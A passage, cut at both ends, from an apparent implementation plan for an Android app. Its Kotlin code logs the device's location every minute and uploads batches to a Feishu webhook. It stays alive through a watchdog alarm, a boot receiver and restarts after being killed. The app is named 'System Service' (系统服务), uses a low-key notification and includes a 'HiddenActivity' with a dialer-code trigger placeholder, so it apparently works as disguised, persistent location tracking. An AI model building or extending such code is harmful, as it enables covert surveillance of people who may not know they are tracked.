import com.monitor.app.db.entities.LocationRecord
import kotlin.math.atan2
import kotlin.math.cos
import kotlin.math.sin
import kotlin.math.sqrt
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class LocationRepository @Inject constructor(
    private val locationRecordDao: LocationRecordDao
) {
    private var lastLocation: Location? = null
    private var lastRecordedMinute: Long = 0
    private var lastInsertedLocation: Location? = null

    suspend fun maybeInsert(location: Location, batteryPct: Int?, minIntervalSeconds: Int) {
        val now = System.currentTimeMillis()
        val currentMinute = now / 60_000

        // Always keep at least one record per minute
        val forceKeep = currentMinute != lastRecordedMinute

        if (!forceKeep && shouldDebounce(location, minIntervalSeconds)) {
            return
        }

        val record = LocationRecord(
            latitude = location.latitude,
            longitude = location.longitude,
            altitude = if (location.hasAltitude()) location.altitude else null,
            accuracy = if (location.hasAccuracy()) location.accuracy else null,
            provider = location.provider ?: "unknown",
            recordedAt = location.time,
            batteryPct = batteryPct
        )
        locationRecordDao.insert(record)
        lastInsertedLocation = location
        lastRecordedMinute = currentMinute
    }

    private fun shouldDebounce(location: Location, minIntervalSeconds: Int): Boolean {
        val prev = lastInsertedLocation ?: return false
        val distance = distanceBetween(prev, location)
        val timeDelta = location.time - prev.time
        return distance < 1.0 && timeDelta < (minIntervalSeconds * 1000L / 2)
    }

    private fun distanceBetween(a: Location, b: Location): Double {
        val dLat = Math.toRadians(b.latitude - a.latitude)
        val dLon = Math.toRadians(b.longitude - a.longitude)
        val lat1 = Math.toRadians(a.latitude)
        val lat2 = Math.toRadians(b.latitude)
        val aH = sin(dLat / 2).pow(2) + sin(dLon / 2).pow(2) * cos(lat1) * cos(lat2)
        val c = 2 * atan2(sqrt(aH), sqrt(1 - aH))
        return 6_371_000 * c
    }

    private fun Double.pow(n: Int): Double = Math.pow(this, n.toDouble())
}
```

- [ ] **Step 2: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/location/LocationRepository.kt
git commit -m "feat: add LocationRepository with debounce and one-per-minute minimum"
```

---

### Task 7: StrategyDecider

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/location/StrategyDecider.kt`

- [ ] **Step 1: Write StrategyDecider**

```kotlin
// app/src/main/kotlin/com/monitor/app/location/StrategyDecider.kt
package com.monitor.app.location

import com.monitor.app.config.AppConfig
import com.monitor.app.util.BatteryMonitor
import com.monitor.app.util.TimeRangeMatcher
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.combine
import java.time.LocalTime
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class StrategyDecider @Inject constructor() {

    enum class Mode { PEAK, OFF_PEAK }

    data class Decision(
        val mode: Mode,
        val intervalSeconds: Int,
        val priority: String,
        val effectiveConfig: String, // "peak", "off_peak_low_power", etc.
        val forceWorkManager: Boolean = false
    )

    fun decide(config: AppConfig, batteryPct: Int, now: LocalTime = LocalTime.now()): Decision {
        // Step 1: pick base period config
        val peakRange = TimeRangeMatcher.TimeRange(
            config.location_strategy.peak_hours.start,
            config.location_strategy.peak_hours.end
        )
        val isPeak = TimeRangeMatcher.isInRange(peakRange, now)
        val periodConfig = if (isPeak) config.location_strategy.peak_hours
                           else config.location_strategy.off_peak_hours

        // Step 2: apply degradation
        val deg = config.degradation
            .sortedByDescending { it.battery_pct_above }
            .find { batteryPct >= it.battery_pct_above }

        val multiplier = deg?.interval_multiplier ?: 1
        val forceWm = deg?.force_workmanager ?: false
        val interval = (periodConfig.interval_seconds * multiplier)
            .coerceAtLeast(60)

        val effectiveConfig = buildString {
            append(if (isPeak) "peak" else "off_peak")
            if (deg != null && deg.mode != "normal") append("_${deg.mode}")
        }

        return Decision(
            mode = if (isPeak) Mode.PEAK else Mode.OFF_PEAK,
            intervalSeconds = interval,
            priority = periodConfig.priority,
            effectiveConfig = effectiveConfig,
            forceWorkManager = forceWm
        )
    }
}
```

- [ ] **Step 2: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/location/StrategyDecider.kt
git commit -m "feat: add StrategyDecider with period selection and degradation logic"
```

---

### Task 8: LocationWorker (Off-peak Mode)

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/location/LocationWorker.kt`

- [ ] **Step 1: Write LocationWorker**

```kotlin
// app/src/main/kotlin/com/monitor/app/location/LocationWorker.kt
package com.monitor.app.location

import android.content.Context
import android.location.Location
import androidx.hilt.work.HiltWorker
import androidx.work.*
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import com.monitor.app.config.ConfigManager
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.util.BatteryMonitor
import com.monitor.app.util.TimeRangeMatcher
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.*
import java.time.LocalTime
import java.util.concurrent.TimeUnit

@HiltWorker
class LocationWorker @AssistedInject constructor(
    @Assisted private val context: Context,
    @Assisted workerParams: WorkerParameters,
    private val configManager: ConfigManager,
    private val locationRepository: LocationRepository,
    private val strategyDecider: StrategyDecider,
    private val diagnosticLogger: DiagnosticLogger
) : CoroutineWorker(context, workerParams) {

    private val fusedClient: FusedLocationProviderClient =
        LocationServices.getFusedLocationProviderClient(context)

    override suspend fun doWork(): Result {
        val config = configManager.getConfigBlocking()
        val batteryPct = getBatterySync()
        val decision = strategyDecider.decide(config, batteryPct)

        val location = withTimeoutOrNull(30_000L) {
            suspendCancellableCoroutine<Location?> { cont ->
                val priority = if (decision.priority == "HIGH_ACCURACY")
                    Priority.PRIORITY_HIGH_ACCURACY
                else Priority.PRIORITY_BALANCED_POWER_ACCURACY

                fusedClient.getCurrentLocation(priority, CancellationTokenSource().token)
                    .addOnSuccessListener { cont.resumeWith(Result.success(it)) }
                    .addOnFailureListener { cont.resumeWith(Result.success(null)) }
            }
        }

        if (location != null) {
            locationRepository.maybeInsert(location, batteryPct, decision.intervalSeconds)
            diagnosticLogger.log("location_workmanager", """{"mode":"${decision.effectiveConfig}","pct":$batteryPct}""")
        }

        return Result.success()
    }

    private fun getBatterySync(): Int {
        return runBlocking {
            withTimeoutOrNull(2000L) {
                BatteryMonitor.observe(context).let { flow ->
                    var result = 100
                    flow.collect { result = it.pct; throw CancellationException() }
                    result
                }
            } ?: 100
        }
    }

    companion object {
        fun schedule(context: Context, intervalSeconds: Int) {
            val work = PeriodicWorkRequestBuilder<LocationWorker>(
                intervalSeconds.toLong(), TimeUnit.SECONDS
            ).setConstraints(
                Constraints.Builder().build()
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "location_offpeak",
                ExistingPeriodicWorkPolicy.UPDATE,
                work
            )
        }

        fun cancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork("location_offpeak")
        }
    }
}
```

- [ ] **Step 2: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/location/LocationWorker.kt
git commit -m "feat: add LocationWorker for off-peak periodic location collection"
```

---

### Task 9: LocationService (Peak Mode)

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/location/LocationService.kt`

- [ ] **Step 1: Write LocationService**

```kotlin
// app/src/main/kotlin/com/monitor/app/location/LocationService.kt
package com.monitor.app.location

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.ServiceLifecycleDispatcher
import com.google.android.gms.location.*
import com.monitor.app.config.AppConfig
import com.monitor.app.config.ConfigManager
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.util.BatteryMonitor
import com.monitor.app.util.TimeRangeMatcher
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import java.time.LocalTime
import javax.inject.Inject

@AndroidEntryPoint
class LocationService : Service(), LifecycleOwner {

    @Inject lateinit var configManager: ConfigManager
    @Inject lateinit var locationRepository: LocationRepository
    @Inject lateinit var strategyDecider: StrategyDecider
    @Inject lateinit var diagnosticLogger: DiagnosticLogger

    private lateinit var fusedClient: FusedLocationProviderClient
    private lateinit var wakeLock: PowerManager.WakeLock
    private val dispatcher = ServiceLifecycleDispatcher(this)
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var locationCallback: LocationCallback? = null

    override fun onCreate() {
        super.onCreate()
        dispatcher.onServicePreSuperOnCreate()
        fusedClient = LocationServices.getFusedLocationProviderClient(this)
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "monitor:location")
        wakeLock.acquire(10 * 60 * 1000L)
        createNotificationChannel()
        diagnosticLogger.log("service_start")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        dispatcher.onServicePreSuperOnStart()
        val config = configManager.getConfigBlocking()
        startForeground(1, buildNotification(config))
        startLocationUpdates(config)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startLocationUpdates(config: AppConfig) {
        val batteryPct = 100 // initial; will refresh on each callback
        val decision = strategyDecider.decide(config, batteryPct)

        val request = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            decision.intervalSeconds * 1000L
        ).setMinIntervalSeconds(decision.intervalSeconds)
            .setMaxUpdateDelayMillis((decision.intervalSeconds * 1500L))
            .build()

        val callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                scope.launch {
                    val pct = getBatterySnapshot()
                    for (loc in result.locations) {
                        val d = strategyDecider.decide(config, pct)
                        locationRepository.maybeInsert(loc, pct, d.intervalSeconds)
                    }
                }
            }
        }
        locationCallback = callback

        try {
            fusedClient.requestLocationUpdates(
                request, callback, mainLooper
            )
        } catch (e: SecurityException) {
            diagnosticLogger.log("location_permission_denied")
        }
    }

    private suspend fun getBatterySnapshot(): Int {
        return try {
            withTimeout(2000L) {
                BatteryMonitor.observe(this@LocationService).let { flow ->
                    var result = 100
                    flow.collect { result = it.pct; throw CancellationException() }
                    result
                }
            }
        } catch (_: Exception) { 100 }
    }

    private fun buildNotification(config: AppConfig): android.app.Notification {
        val keepAlive = config.keep_alive
        val channelId = "monitor_location"
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle(keepAlive.foreground_service_notification.title)
            .setContentText(keepAlive.foreground_service_notification.text)
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "monitor_location",
                "位置服务",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "设备位置服务运行中"
                setShowBadge(false)
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(channel)
        }
    }

    override fun onDestroy() {
        locationCallback?.let { fusedClient.removeLocationUpdates(it) }
        if (wakeLock.isHeld) wakeLock.release()
        scope.cancel()
        diagnosticLogger.log("service_stop")
        dispatcher.onServicePreSuperOnDestroy()
        super.onDestroy()
    }

    override val lifecycle: Lifecycle get() = dispatcher.lifecycle
}
```

- [ ] **Step 2: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/location/LocationService.kt
git commit -m "feat: add LocationService for peak-mode foreground location collection"
```

---

### Task 10: Report Engine

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/report/FeishuClient.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/report/ReportPayload.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/report/ReportWorker.kt`

- [ ] **Step 1: Write FeishuClient**

```kotlin
// app/src/main/kotlin/com/monitor/app/report/FeishuClient.kt
package com.monitor.app.report

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class FeishuClient @Inject constructor() {

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    data class ReportResult(
        val success: Boolean,
        val responseCode: Int,
        val error: String? = null
    )

    fun send(webhookUrl: String, payload: ReportPayload.Batch): ReportResult {
        return try {
            val cardJson = buildCardJson(payload)
            val body = cardJson.toRequestBody(jsonMediaType)
            val request = Request.Builder().url(webhookUrl).post(body).build()
            val response = client.newCall(request).execute()
            val isSuccess = response.isSuccessful
            val respBody = response.body?.string() ?: ""
            // Feishu returns {"code":0,"msg":"success"} on success
            val feishuOk = respBody.contains("\"code\":0")
            ReportResult(
                success = isSuccess && feishuOk,
                responseCode = response.code
            )
        } catch (e: Exception) {
            ReportResult(success = false, responseCode = -1, error = e.message)
        }
    }

    private fun buildCardJson(batch: ReportPayload.Batch): String {
        val recordsJson = batch.records.joinToString(",") {
            """{"lat":${it.lat},"lng":${it.lng},"alt":${it.alt ?: "null"},"acc":${it.acc ?: "null"},"provider":"${it.provider}","ts":${it.ts},"battery":${it.battery ?: "null"}}"""
        }
        return """
        {
          "msg_type": "interactive",
          "card": {
            "header": {
              "title": {"content": "位置上报", "tag": "plain_text"},
              "template": "blue"
            },
            "elements": [
              {"tag": "plain_text", "content": "设备: ${batch.deviceId}"},
              {"tag": "plain_text", "content": "时间戳: ${batch.timestamp}"},
              {"tag": "plain_text", "content": "条数: ${batch.records.size}"},
              {"tag": "plain_text", "content": "数据: [$recordsJson]"}
            ]
          }
        }
        """.trimIndent()
    }
}
```

- [ ] **Step 2: Write ReportPayload**

```kotlin
// app/src/main/kotlin/com/monitor/app/report/ReportPayload.kt
package com.monitor.app.report

import com.monitor.app.db.entities.LocationRecord

object ReportPayload {

    data class Record(
        val lat: Double,
        val lng: Double,
        val alt: Double?,
        val acc: Float?,
        val provider: String,
        val ts: Long,
        val battery: Int?
    )

    data class Batch(
        val timestamp: Long,
        val deviceId: String,
        val records: List<Record>
    )

    fun build(records: List<LocationRecord>, deviceId: String): Batch {
        return Batch(
            timestamp = System.currentTimeMillis(),
            deviceId = deviceId,
            records = records.map { r ->
                Record(
                    lat = r.latitude,
                    lng = r.longitude,
                    alt = r.altitude,
                    acc = r.accuracy,
                    provider = r.provider,
                    ts = r.recordedAt,
                    battery = r.batteryPct
                )
            }
        )
    }
}
```

- [ ] **Step 3: Write ReportWorker**

```kotlin
// app/src/main/kotlin/com/monitor/app/report/ReportWorker.kt
package com.monitor.app.report

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.*
import com.monitor.app.config.ConfigManager
import com.monitor.app.db.LocationRecordDao
import com.monitor.app.db.ReportLogDao
import com.monitor.app.db.entities.ReportLog
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.util.DeviceId
import com.monitor.app.util.TimeRangeMatcher
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import kotlinx.coroutines.delay
import java.time.LocalTime
import java.util.concurrent.TimeUnit

@HiltWorker
class ReportWorker @AssistedInject constructor(
    @Assisted private val context: Context,
    @Assisted workerParams: WorkerParameters,
    private val configManager: ConfigManager,
    private val locationRecordDao: LocationRecordDao,
    private val reportLogDao: ReportLogDao,
    private val feishuClient: FeishuClient,
    private val diagnosticLogger: DiagnosticLogger
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        val config = configManager.getConfigBlocking()
        val deviceId = DeviceId.get(context)

        // Check if this time window has an active report interval
        val now = LocalTime.now()
        val activeInterval = config.report.intervals.find { interval ->
            val range = TimeRangeMatcher.TimeRange(interval.start, interval.end)
            TimeRangeMatcher.isInRange(range, now)
        }
        if (activeInterval == null) return Result.success()

        val lastReportedId = reportLogDao.getLastReportedRecordId()
        val batchSize = config.report.batch_size

        var currentFromId = lastReportedId + 1
        var retryCount = 0
        var allSuccess = true

        while (true) {
            val batch = locationRecordDao.getUnreported(currentFromId, batchSize)
            if (batch.isEmpty()) break

            val payload = ReportPayload.build(batch, deviceId)
            val result = feishuClient.send(config.network.base_url, payload)

            val log = ReportLog(
                fromRecordId = batch.first().id,
                toRecordId = batch.last().id,
                recordCount = batch.size,
                reportedAt = System.currentTimeMillis(),
                responseCode = result.responseCode,
                success = result.success
            )
            reportLogDao.insert(log)
            diagnosticLogger.log(
                if (result.success) "report_success" else "report_fail",
                """{"count":${batch.size},"code":${result.responseCode}}"""
            )

            if (result.success) {
                currentFromId = batch.last().id + 1
                retryCount = 0
            } else {
                // 4xx = config error, abandon immediately without retry
                val isClientError = result.responseCode in 400..499
                if (isClientError) {
                    diagnosticLogger.log("report_abandon",
                        """{"count":${batch.size},"code":${result.responseCode},"reason":"4xx_client_error"}""")
                    currentFromId = batch.last().id + 1
                    retryCount = 0
                    allSuccess = false
                } else {
                    retryCount++
                    if (retryCount >= config.report.retry_max) {
                        diagnosticLogger.log("report_abandon", """{"count":${batch.size}}""")
                        currentFromId = batch.last().id + 1
                        retryCount = 0
                        allSuccess = false
                    } else {
                        val backoffSeconds = config.report.retry_backoff_base_seconds * Math.pow(2.0, retryCount - 1.0).toInt()
                        delay(backoffSeconds * 1000L)
                        // continue while loop to retry same batch
                    }
                }
            }
        }

        return if (allSuccess) Result.success() else Result.success()
    }

    companion object {
        fun schedule(context: Context, intervalSeconds: Int) {
            val work = PeriodicWorkRequestBuilder<ReportWorker>(
                intervalSeconds.toLong(), TimeUnit.SECONDS
            ).setConstraints(
                Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "report",
                ExistingPeriodicWorkPolicy.UPDATE,
                work
            )
        }

        fun cancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork("report")
        }
    }
}
```

- [ ] **Step 4: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/report/
git commit -m "feat: add report engine with Feishu webhook client and ReportWorker"
```

---

### Task 11: Keep-Alive System

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/keepalive/KeepAliveManager.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/keepalive/WatchdogReceiver.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/keepalive/BootReceiver.kt`

- [ ] **Step 1: Write KeepAliveManager**

```kotlin
// app/src/main/kotlin/com/monitor/app/keepalive/KeepAliveManager.kt
package com.monitor.app.keepalive

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import com.monitor.app.config.ConfigManager
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.location.LocationService
import dagger.hilt.android.qualifiers.ApplicationContext
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class KeepAliveManager @Inject constructor(
    @ApplicationContext private val context: Context,
    private val configManager: ConfigManager,
    private val diagnosticLogger: DiagnosticLogger
) {
    private val prefs: SharedPreferences =
        context.getSharedPreferences("keep_alive", Context.MODE_PRIVATE)

    private var restartCount = 0
    private var restartWindowStart = 0L

    fun markAlive() {
        prefs.edit().putLong("last_alive_ts", System.currentTimeMillis()).apply()
    }

    fun markCleanShutdown() {
        prefs.edit().remove("last_alive_ts").apply()
        diagnosticLogger.log("service_stop", """{"reason":"clean_shutdown"}""")
    }

    fun checkWasKilled(): Boolean {
        val lastAlive = prefs.getLong("last_alive_ts", 0)
        if (lastAlive == 0L) return false
        val elapsed = System.currentTimeMillis() - lastAlive
        return elapsed > 120_000L // 2 minutes without alive ping = killed
    }

    fun restartIfKilled() {
        val config = configManager.getConfigBlocking()
        if (!config.keep_alive.restart_on_kill.enabled) return

        val now = System.currentTimeMillis()
        if (now - restartWindowStart > 3_600_000) {
            restartCount = 0
            restartWindowStart = now
        }

        if (restartCount >= config.keep_alive.restart_on_kill.max_restarts_per_hour) {
            diagnosticLogger.log("restart_throttled",
                """{"count":$restartCount,"max":${config.keep_alive.restart_on_kill.max_restarts_per_hour}}""")
            return
        }

        restartCount++
        val intent = Intent(context, LocationService::class.java)
        context.startForegroundService(intent)
        diagnosticLogger.log("service_restart",
            """{"count":$restartCount,"delay":${config.keep_alive.restart_on_kill.restart_delay_seconds}}""")
    }

    fun scheduleWatchdog(intervalSeconds: Int) {
        val config = configManager.getConfigBlocking()
        if (!config.keep_alive.watchdog.enabled) return

        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, WatchdogReceiver::class.java)
        val pending = PendingIntent.getBroadcast(
            context, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        alarmManager.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            intervalSeconds * 1000L,
            intervalSeconds * 1000L,
            pending
        )
    }

    fun cancelWatchdog() {
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(context, WatchdogReceiver::class.java)
        val pending = PendingIntent.getBroadcast(
            context, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        alarmManager.cancel(pending)
    }
}
```

- [ ] **Step 2: Write WatchdogReceiver**

```kotlin
// app/src/main/kotlin/com/monitor/app/keepalive/WatchdogReceiver.kt
package com.monitor.app.keepalive

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.app.ActivityManager
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.location.LocationService
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class WatchdogReceiver : BroadcastReceiver() {

    @Inject lateinit var diagnosticLogger: DiagnosticLogger

    override fun onReceive(context: Context, intent: Intent) {
        diagnosticLogger.log("alarm_wakeup", """{"action":"check"}""")

        val isRunning = isServiceRunning(context, LocationService::class.java)
        if (!isRunning) {
            diagnosticLogger.log("alarm_wakeup", """{"service_alive":false,"action":"restart"}""")
            val serviceIntent = Intent(context, LocationService::class.java)
            context.startForegroundService(serviceIntent)
        }
    }

    private fun isServiceRunning(context: Context, serviceClass: Class<*>): Boolean {
        val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        return manager.getRunningServices(Int.MAX_VALUE)
            .any { it.service.className == serviceClass.name }
    }
}
```

- [ ] **Step 3: Write BootReceiver**

```kotlin
// app/src/main/kotlin/com/monitor/app/keepalive/BootReceiver.kt
package com.monitor.app.keepalive

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.monitor.app.diag.DiagnosticLogger
import com.monitor.app.location.LocationService
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class BootReceiver : BroadcastReceiver() {

    @Inject lateinit var diagnosticLogger: DiagnosticLogger

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            diagnosticLogger.log("device_reboot")
            val serviceIntent = Intent(context, LocationService::class.java)
            context.startForegroundService(serviceIntent)
        }
    }
}
```

- [ ] **Step 4: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/keepalive/
git commit -m "feat: add keep-alive system with watchdog, boot receiver, and restart throttling"
```

---

### Task 12: UI Layer

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/ui/HiddenActivity.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/ui/GuideActivity.kt`
- Create: `monitor2605/app/src/main/res/layout/activity_hidden.xml`
- Create: `monitor2605/app/src/main/res/layout/activity_guide.xml`

- [ ] **Step 1: Write HiddenActivity**

```kotlin
// app/src/main/kotlin/com/monitor/app/ui/HiddenActivity.kt
package com.monitor.app.ui

import android.content.Intent
import android.os.Bundle
import android.os.Environment
import android.widget.Toast
import androidx.activity.ComponentActivity
import com.monitor.app.diag.DiagnosticLogger
import dagger.hilt.android.AndroidEntryPoint
import java.io.File
import javax.inject.Inject

@AndroidEntryPoint
class HiddenActivity : ComponentActivity() {

    @Inject lateinit var diagnosticLogger: DiagnosticLogger

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        exportLogs()
        finish()
    }

    private fun exportLogs() {
        try {
            val logFiles = diagnosticLogger.getLogFiles()
            val downloadDir = Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_DOWNLOADS
            )
            val exportDir = File(downloadDir, "monitor_logs")
            exportDir.mkdirs()

            for (file in logFiles) {
                file.copyTo(File(exportDir, file.name), overwrite = true)
            }

            Toast.makeText(this, "日志已导出到 ${exportDir.absolutePath}", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            Toast.makeText(this, "导出失败: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    companion object {
        fun launchViaDialer(context: android.content.Context) {
            // Placeholder for dialer code trigger — implement if needed
        }
    }
}
```

- [ ] **Step 2: Write GuideActivity**

```kotlin
// app/src/main/kotlin/com/monitor/app/ui/GuideActivity.kt
package com.monitor.app.ui

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import com.monitor.app.R
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class GuideActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_guide)

        val instructions = when {
            Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true) ->
                "检测到小米设备。请前往 设置 → 应用设置 → 授权管理 → 自启动管理 → 允许本应用自启动"
            Build.MANUFACTURER.equals("Huawei", ignoreCase = true) ->
                "检测到华为设备。请前往 手机管家 → 应用启动管理 → 关闭本应用的自动管理 → 允许自启动/关联启动/后台活动"
            Build.MANUFACTURER.equals("OPPO", ignoreCase = true) || Build.MANUFACTURER.equals("OnePlus", ignoreCase = true) ->
                "检测到OPPO设备。请前往 设置 → 应用管理 → 本应用 → 耗电保护 → 允许后台运行"
            else ->
                "请确保本应用已被授予后台定位权限和自启动权限。可前往系统设置的应用管理中配置。"
        }

        findViewById<TextView>(R.id.guide_text).text = instructions
        findViewById<Button>(R.id.btn_finish).setOnClickListener {
            finish()
        }
    }
}
```

- [ ] **Step 3: Write activity_hidden layout**

```xml
<!-- app/src/main/res/layout/activity_hidden.xml -->
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="服务运行中"
        android:textSize="14sp" />
</LinearLayout>
```

- [ ] **Step 4: Write activity_guide layout**

```xml
<!-- app/src/main/res/layout/activity_guide.xml -->
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical"
    android:padding="24dp">

    <TextView
        android:id="@+id/guide_text"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:textSize="16sp"
        android:lineSpacingExtra="4dp"
        android:text="请按照引导完成权限设置。" />

    <Button
        android:id="@+id/btn_finish"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="32dp"
        android:text="已设置完毕" />
</LinearLayout>
```

- [ ] **Step 5: Add string resources** (if needed, create `app/src/main/res/values/strings.xml` if not present)

```xml
<!-- app/src/main/res/values/strings.xml -->
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">系统服务</string>
</resources>
```

- [ ] **Step 6: Commit**

```bash
git add app/src/main/kotlin/com/monitor/app/ui/ app/src/main/res/
git commit -m "feat: add HiddenActivity for log export and GuideActivity for OEM instructions"
```

---

### Task 13: Application Class + Database Module

**Files:**
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/MonitorApplication.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/db/DatabaseModule.kt`
- Create: `monitor2605/app/src/main/kotlin/com/monitor/app/CleanupWorker.kt`

- [ ] **Step 1: Write Hilt database module**

```kotlin
// app/src/main/kotlin/com/monitor/app/db/DatabaseModule.kt
package com.monitor.app.db

import android.content.Context
import androidx.room.Room
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import javax.inject.Singleton

@Module
@InstallIn(SingletonComponent::class)
object DatabaseModule {

    @Provides
    @Singleton
    fun provideDatabase(@ApplicationContext context: Context): AppDatabase {
        return Room.databaseBuilder(
            context.applicationContext,
            AppDatabase::class.java,
            "monitor.db"
        ).build()
    }

    @Provides
    fun provideLocationRecordDao(db: AppDatabase): LocationRecordDao = db.locationRecordDao()

    @Provides
    fun provideReportLogDao(db: AppDatabase): ReportLogDao = db.reportLogDao()
}
```

- [ ] **Step 2: Write CleanupWorker**

```kotlin
// app/src/main/kotlin/com/monitor/app/CleanupWorker.kt
package com.monitor.app

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.*
import com.monitor.app.db.LocationRecordDao
import com.monitor.app.db.ReportLogDao
import com.monitor.app.diag.DiagnosticLogger
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import java.util.concurrent.TimeUnit

@HiltWorker
class CleanupWorker @AssistedInject constructor(
    @Assisted private val context: Context,
    @Assisted workerParams: WorkerParameters,
    private val locationRecordDao: LocationRecordDao,
